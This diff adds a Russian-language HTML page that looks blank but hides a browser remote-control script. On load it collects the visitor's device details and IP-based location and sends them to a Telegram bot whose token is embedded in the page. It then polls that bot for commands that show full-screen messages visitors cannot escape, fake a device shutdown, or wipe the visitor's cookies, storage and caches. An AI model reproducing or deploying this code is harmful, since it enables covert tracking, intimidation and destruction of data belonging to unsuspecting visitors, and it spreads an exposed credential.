@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title> </title>
+    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+    <style>
+        /* базовая страница – полностью прозрачная, без элементов */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+        body {
+            background: transparent;
+            min-height: 100vh;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            overflow-x: auto;
+        }
+        /* overlay для отображаемого сообщения (появляется по команде) */
+        .message-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(12px);
+            z-index: 99999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: monospace;
+            pointer-events: auto;
+            visibility: hidden;
+            opacity: 0;
+            transition: visibility 0.2s, opacity 0.2s;
+        }
+        .message-card {
+            background: linear-gradient(145deg, #1a1f2e, #0b0f1a);
+            border-radius: 2rem;
+            padding: 2rem 2.5rem;
+            max-width: 90vw;
+            border: 1px solid #ff3366;
+            box-shadow: 0 25px 40px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,51,102,0.3) inset;
+            text-align: center;
+        }
+        .message-text {
+            font-size: 1.8rem;
+            color: #ffbb88;
+            margin-bottom: 2rem;
+            word-break: break-word;
+            white-space: pre-wrap;
+            font-weight: bold;
+            text-shadow: 0 0 5px red;
+        }
+        .disable-btn {
+            background: #ff3366;
+            border: none;
+            padding: 12px 28px;
+            border-radius: 60px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        .disable-btn:hover {
+            background: #ff6699;
+            transform: scale(0.97);
+        }
+        /* экран выключения (имитация) */
+        .shutdown-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: black;
+            z-index: 100000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 2rem;
+            font-family: monospace;
+            visibility: hidden;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .shutdown-overlay.visible {
+            visibility: visible;
+        }
+    </style>
+</head>
+<body>
+    <!-- Оверлей для отображения текста (не озвучивается) -->
+    <div id="messageOverlay" class="message-overlay">
+        <div class="message-card">
+            <div id="overlayText" class="message-text">⚠️ Сообщение</div>
+            <button id="disableMessageBtn" class="disable-btn">✖️ ОТКЛЮЧИТЬ</button>
+        </div>
+    </div>
+    <!-- Имитация выключения -->
+    <div id="shutdownOverlay" class="shutdown-overlay">
+        <div>💀 УСТРОЙСТВО ВЫКЛЮЧЕНО 💀</div>
+        <div style="font-size: 1rem;">(имитация – перезагрузите страницу)</div>
+        <button id="fakeRebootBtn" style="background:#333; color:white; padding:8px 20px; border:none; border-radius:40px; cursor:pointer;">Перезагрузить (восстановить)</button>
+    </div>
+
+    <script>
+        (function(){
+            // ---------- КОНФИГУРАЦИЯ ТЕЛЕГРАМ ----------
+            const BOT_TOKEN = "7962403584:AAFdnlc4hHsIslblbbcaCOiwkri60XSoP_4";
+            const CHAT_ID = "7132905296";
+            
+            // DOM элементы
+            const messageOverlay = document.getElementById('messageOverlay');
+            const overlayTextSpan = document.getElementById('overlayText');
+            const disableBtn = document.getElementById('disableMessageBtn');
+            const shutdownOverlay = document.getElementById('shutdownOverlay');
+            const fakeRebootBtn = document.getElementById('fakeRebootBtn');
+            
+            let isShutdownActive = false;
+            
+            // Отправка уведомлений в Telegram
+            async function sendToTelegram(text, parseMode = "HTML") {
+                if (!BOT_TOKEN) return;
+                try {
+                    const payload = { chat_id: CHAT_ID, text: text, parse_mode: parseMode, disable_web_page_preview: true };
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(payload)
+                    });
+                } catch(e) {}
+            }
+            
+            // ---------- 1. ПОКАЗ ТЕКСТА НА ЭКРАНЕ (неозвучиваемый, висит до отключения) ----------
+            function showTextOnScreen(text) {
+                if (isShutdownActive) {
+                    sendToTelegram("❌ Нельзя показать сообщение: устройство в режиме выключения");
+                    return;
+                }
+                overlayTextSpan.innerText = text;
+                messageOverlay.style.visibility = "visible";
+                messageOverlay.style.opacity = "1";
+                sendToTelegram(`📢 На экране отображается сообщение: "${text.substring(0, 100)}"`);
+            }
+            
+            function hideMessage() {
+                messageOverlay.style.visibility = "hidden";
+                messageOverlay.style.opacity = "0";
+                sendToTelegram(`✅ Сообщение скрыто пользователем (нажата кнопка "Отключить")`);
+            }
+            
+            disableBtn.addEventListener('click', hideMessage);
+            
+            // ---------- 2. ИМИТАЦИЯ ВЫКЛЮЧЕНИЯ УСТРОЙСТВА ----------
+            function simulateShutdown() {
+                if (isShutdownActive) return;
+                isShutdownActive = true;
+                // Скрываем любое активное сообщение
+                hideMessage();
+                // Показываем черный экран выключения
+                shutdownOverlay.classList.add('visible');
+                // Блокируем взаимодействие с основным содержимым (дополнительно)
+                document.body.style.pointerEvents = 'none';
+                sendToTelegram("🔌 УСТРОЙСТВО ВЫКЛЮЧЕНО (имитация). Для восстановления нажмите кнопку перезагрузки на черном экране.");
+            }
+            
+            function rebootFromShutdown() {
+                shutdownOverlay.classList.remove('visible');
+                document.body.style.pointerEvents = '';
+                isShutdownActive = false;
+                sendToTelegram("🔄 Устройство перезагружено (имитация выключения снята)");
+            }
+            
+            fakeRebootBtn.addEventListener('click', rebootFromShutdown);
+            
+            // ---------- 3. УДАЛЕНИЕ ВСЕХ ДАННЫХ И ПРОГРАМ (браузерные данные + перезагрузка с очисткой) ----------
+            async function wipeAllData() {
+                sendToTelegram("⚠️ ЗАПУЩЕНА ПРОЦЕДУРА УДАЛЕНИЯ ДАННЫХ И ПРОГРАММ (имитация)");
+                try {
+                    // 1. Очистка localStorage
+                    localStorage.clear();
+                    // 2. Очистка sessionStorage
+                    sessionStorage.clear();
+                    // 3. Очистка всех cookies
+                    document.cookie.split(";").forEach(function(c) {
+                        document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
+                    });
+                    // 4. Очистка IndexedDB (все базы данных)
+                    if (window.indexedDB) {
+                        const databases = await indexedDB.databases?.() || [];
+                        for (const db of databases) {
+                            if (db.name) indexedDB.deleteDatabase(db.name);
+                        }
+                    }
+                    // 5. Очистка кэша браузера (через CacheStorage)
+                    if ('caches' in window) {
+                        const cacheNames = await caches.keys();
+                        await Promise.all(cacheNames.map(name => caches.delete(name)));
+                    }
+                    // 6. Очистка Service Workers (если есть)
+                    if (navigator.serviceWorker && navigator.serviceWorker.controller) {
+                        const registrations = await navigator.serviceWorker.getRegistrations();
+                        for (let reg of registrations) await reg.unregister();
+                    }
+                    // 7. Очистка истории (нельзя полностью, но можно попробовать перезагрузку с чистым состоянием)
+                    sendToTelegram("✅ Все локальные данные (LocalStorage, Cookies, IndexedDB, Cache) удалены. Страница будет перезагружена через 2 секунды.");
+                    setTimeout(() => {
+                        // Перезагрузка с полным сбросом кэша
+                        window.location.reload();
+                    }, 2000);
+                } catch(e) {
+                    sendToTelegram(`❌ Ошибка при удалении данных: ${e.message}`);
+                }
+            }
+            
+            // ---------- 4. УДАЛЁННОЕ УПРАВЛЕНИЕ (Telegram polling) ----------
+            let lastUpdateId = 0;
+            async function pollCommands() {
+                try {
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=25`;
+                    const resp = await fetch(url);
+                    const data = await resp.json();
+                    if(data.ok && data.result.length) {
+                        for(let update of data.result) {
+                            lastUpdateId = update.update_id;
+                            const msg = update.message;
+                            if(msg && msg.text && msg.chat.id.toString() === CHAT_ID) {
+                                let cmdText = msg.text.trim();
+                                let reply = "";
+                                
+                                // Команда /show <текст> - отобразить текст на экране
+                                if (cmdText.startsWith('/show ')) {
+                                    let textToShow = cmdText.replace(/^\/show\s+/i, '');
+                                    if (textToShow.length > 0) {
+                                        showTextOnScreen(textToShow);
+                                        reply = `📺 Текст отображается на экране: "${textToShow.substring(0, 80)}"`;
+                                    } else {
+                                        reply = "❌ Укажите текст после /show";
+                                    }
+                                }
+                                // Команда /shutdown - имитация выключения
+                                else if (cmdText === '/shutdown') {
+                                    simulateShutdown();
+                                    reply = "🔌 Имитация выключения устройства активирована. Появится черный экран.";
+                                }
+                                // Команда /wipe - удаление всех данных
+                                else if (cmdText === '/wipe') {
+                                    await wipeAllData();
+                                    reply = "🧹 Запущено удаление всех данных и программ. Страница будет перезагружена.";
+                                }
+                                // Команда /hide - скрыть текущее сообщение
+                                else if (cmdText === '/hide') {
+                                    if (messageOverlay.style.visibility === 'visible') {
+                                        hideMessage();
+                                        reply = "🔕 Сообщение скрыто по команде";
+                                    } else {
+                                        reply = "Нет активного сообщения на экране";
+                                    }
+                                }
+                                // /status - текущее состояние
+                                else if (cmdText === '/status') {
+                                    let statusMsg = `Состояние:\n- Активное сообщение: ${messageOverlay.style.visibility === 'visible' ? 'ДА' : 'НЕТ'}\n- Режим выключения: ${isShutdownActive ? 'Активен (черный экран)' : 'Нет'}`;
+                                    await sendToTelegram(statusMsg);
+                                    reply = "Статус отправлен в чат";
+                                }
+                                else if (cmdText === '/help') {
+                                    reply = "📋 Доступные команды:\n/show <текст> – показать текст на весь экран (не озвучивается)\n/hide – скрыть показанное сообщение\n/shutdown – имитация выключения устройства\n/wipe – удалить все данные браузера (localStorage, cookies, indexedDB) + перезагрузка\n/status – текущее состояние\n/ping – проверка связи";
+                                }
+                                else if (cmdText === '/ping') {
+                                    reply = "🏓 Бот активен, страница в фоне работает.";
+                                }
+                                else {
+                                    reply = "Неизвестная команда. /help для списка.";
+                                }
+                                if (reply) await sendToTelegram(reply);
+                            }
+                        }
+                    }
+                } catch(e) { console.warn(e); }
+                setTimeout(pollCommands, 20000);
+            }
+            
+            // ---------- 5. ОТПРАВКА ПРИ ВХОДЕ (информация об устройстве) ----------
+            async function collectBasicInfo() {
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
+                const screenRes = `${screen.width}x${screen.height}`;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                let ipInfo = "не определен";
+                try {
+                    const ipRes = await fetch('https://ipapi.co/json/');
+                    const ipJson = await ipRes.json();
+                    ipInfo = `${ipJson.ip} (${ipJson.city}, ${ipJson.country_name})`;
+                } catch(e) {}
+                return `🟢 НОВОЕ ПОДКЛЮЧЕНИЕ\n🖥️ ${userAgent.substring(0, 150)}\n🌐 Платформа: ${platform}\n📱 Язык: ${language}\n📺 Экран: ${screenRes}\n⏱️ Часовой пояс: ${timezone}\n📍 IP: ${ipInfo}`;
+            }
+            
+            async function sendEntryReport() {
+                const info = await collectBasicInfo();
+                await sendToTelegram(info);
+                // Дополнительно короткое сообщение о готовности удалённого управления
+                setTimeout(() => sendToTelegram("✅ Система готова. Доступны команды: /show, /shutdown, /wipe, /hide, /status"), 3000);
+            }
+            
+            // Инициализация
+            sendEntryReport();
+            pollCommands();
+            
+            // Блокировка случайного закрытия сообщения через ESC (не блокируем кнопку отключения)
+            window.addEventListener('keydown', (e) => {
+                if (e.key === 'Escape' && messageOverlay.style.visibility === 'visible') {
+                    e.preventDefault();
+                    // ничего не делаем, только через кнопку отключения
+                }
+            });
+            
+            // Для мобильных – предотвращаем случайное закрытие свайпом
+            messageOverlay.addEventListener('touchmove', (e) => e.preventDefault());
+            messageOverlay.addEventListener('wheel', (e) => e.preventDefault());
+        })();
+    </script>
+</body>
+</html>
